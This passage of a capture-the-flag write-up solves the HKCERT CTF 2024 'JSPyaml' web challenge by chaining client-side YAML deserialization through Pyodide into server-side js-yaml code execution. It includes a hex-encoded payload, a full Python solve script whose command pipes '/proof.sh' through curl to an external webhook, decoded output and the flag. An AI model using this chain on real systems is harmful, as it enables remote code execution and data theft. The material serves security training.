Cx7a%5Cx6f%5Cx76%5Cx4c%5Cx33%5Cx64%5Cx6c%5Cx59%5Cx6d%5Cx68%5Cx76%5Cx62%5Cx32%5Cx73%5Cx75%5Cx63%5Cx32%5Cx6c%5Cx30%5Cx5a%5Cx53%5Cx38%5Cx78%5Cx5a%5Cx47%5Cx56%5Cx6b%5Cx4e%5Cx6a%5Cx41%5Cx78%5Cx5a%5Cx43%5Cx31%5Cx6d%5Cx4d%5Cx32%5Cx59%5Cx78%5Cx4c%5Cx54%5Cx51%5Cx77%5Cx5a%5Cx57%5Cx49%5Cx74%5Cx59%5Cx54%5Cx6b%5Cx35%5Cx59%5Cx79%5Cx31%5Cx68%5Cx59%5Cx6a%5Cx6b%5Cx33%5Cx4e%5Cx44%5Cx59%5Cx7a%5Cx4e%5Cx44%5Cx59%5Cx30%5Cx4d%5Cx6a%5Cx55%5Cx6e%5Cx4b%5Cx53%5Cx35%5Cx30%5Cx62%5Cx31%5Cx4e%5Cx30%5Cx63%5Cx6d%5Cx6c%5Cx75%5Cx5a%5Cx79%5Cx67%5Cx70%5Cx4b%5Cx58%5Cx30%5Cx69%5Cx22%5Cx29%5Cx29%5Cx3b%5Cx66%5Cx65%5Cx74%5Cx63%5Cx68%5Cx28%5Cx22%5Cx2f%5Cx2f%5Cx6c%5Cx6f%5Cx63%5Cx61%5Cx6c%5Cx68%5Cx6f%5Cx73%5Cx74%5Cx3a%5Cx33%5Cx30%5Cx30%5Cx30%5Cx2f%5Cx64%5Cx65%5Cx62%5Cx75%5Cx67%5Cx22%5Cx2c%5Cx7b%5Cx6d%5Cx65%5Cx74%5Cx68%5Cx6f%5Cx64%5Cx3a%5Cx22%5Cx50%5Cx4f%5Cx53%5Cx54%5Cx22%5Cx2c%5Cx62%5Cx6f%5Cx64%5Cx79%5Cx3a%5Cx64%5Cx61%5Cx74%5Cx61%5Cx7d%5Cx29%5Cx27%5Cx29%5Cx29%22
```

This allows us to send the payload to the bot without having some weird YAML syntax error.

- Send URL `http://localhost:3000/#<client-side_YAML_deserialization_payload_here>` to the bot

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117220837.png)

> Note: Don't worry about the hCaptcha warning. We disabled it on the server-side.

- Receiving the POST request on our webhook site

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117221005.png)

Decoded base64 string:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|21:57:18(HKT)]
└> echo -n 'IyEvYmluL3NoCmVjaG8gaGtjZXJ0MjJ7MjIyMjIyMjIyMjIyMjIyMjIyMjJ9' | base64 -d
#!/bin/sh
echo hkcert22{22222222222222222222}
```

Let's go! It worked on our local environment! Let's get the real flag on the remote instance.

Oh also, to automate the above steps, I wrote the following Python script to generate the final payload:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
from base64 import b64encode
from urllib.parse import quote

class Solver():
    @staticmethod
    def stringToHex(inputString):
        # format hex string with delimiter "\x"
        hexRepresentation = ''.join([rf'\x{char.encode("utf-8").hex()}' for char in inputString])
        return hexRepresentation
    
    @staticmethod
    def prepareServerSideYamlDeserializationPayload(webhookUrl):
        payload = b64encode(f'''"toString": !<tag:yaml.org,2002:js/function> "function (){{console.log(process.mainModule.require('child_process').execSync('cat /proof.sh | base64 -w0 | curl -d @- {webhookUrl}').toString())}}"'''.encode()).decode()
        return payload
    
    @staticmethod
    def prepareClientSideYamlDeserializationPayload(serverSideYamlDeserializationPayload):
        hexPythonCode = Solver.stringToHex(f'''print(__import__('pyodide').code.run_js('document.cookie="debug=on";const data=new URLSearchParams();data.append("yaml", atob("{serverSideYamlDeserializationPayload}"));fetch("//localhost:3000/debug",{{method:"POST",body:data}})'))''')

        payload = f'''!!python/object/new:type
  args: ["z", !!python/tuple [], {{"extend": !!python/name:exec }}]
  listitems: "{hexPythonCode}"'''
        return quote(payload)

    def solve(self, webhookUrl):
        serverSideYamlDeserializationPayload = Solver.prepareServerSideYamlDeserializationPayload(webhookUrl)
        clientSideYamlDeserializationPayload = Solver.prepareClientSideYamlDeserializationPayload(serverSideYamlDeserializationPayload)
        
        finalPayload = f'http://localhost:3000/#{clientSideYamlDeserializationPayload}'
        print(f'[*] Send the following payload to the bot:\n{finalPayload}')

if __name__ == '__main__':
    solver = Solver()

    webhookUrl = 'https://webhook.site/1ded601d-f3f1-40eb-a99c-ab9746346425'
    solver.solve(webhookUrl)
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|22:31:50(HKT)]
└> python3 solve.py
[*] Send the following payload to the bot:
http://localhost:3000/report#%21%21python%2[...]
```

Remote instance's POST request to our webhook site:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117224109.png)

Base64 decoded:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|22:39:21(HKT)]
└> echo -n 'IyEvYmluL3NoCmVjaG8gaGtjZXJ0MjR7T3dhc3BfMHdhc21fbWExd2FyZV9wYWx3YXJlfQ==' | base64 -d
#!/bin/sh
echo hkcert24{Owasp_0wasm_ma1ware_palware}
```

- **Flag: `hkcert24{Owasp_0wasm_ma1ware_palware}`**

## Conclusion

What we've learned:

1. Client-side YAML deserialization to server-side YAML deserialization via Pyodide